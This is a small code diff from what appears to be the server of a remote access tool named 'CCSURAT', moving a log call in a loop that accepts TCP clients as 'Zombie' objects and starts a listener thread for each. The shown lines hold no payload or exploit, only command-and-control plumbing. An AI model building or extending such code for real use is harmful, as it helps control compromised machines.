@@ -40,12 +40,12 @@ namespace CCSURAT_Server
                     if (listener.Pending())
                     {
                         TcpClient client = listener.AcceptTcpClient();
+                        Log("Accepted Client Connection");
                         Zombie zombie = new Zombie(mainForm, client);
                         zombies.Add(zombie);
                         Thread zombieThread = new Thread(new ThreadStart(zombie.ListenForData));
                         zombieThread.IsBackground = true;
                         zombieThread.Start();
-                        Log("Accepted Client Connection");
                         mainForm.UpdateStatus();
                     }
                     // Need to test this sleep, see if it messes up communication.
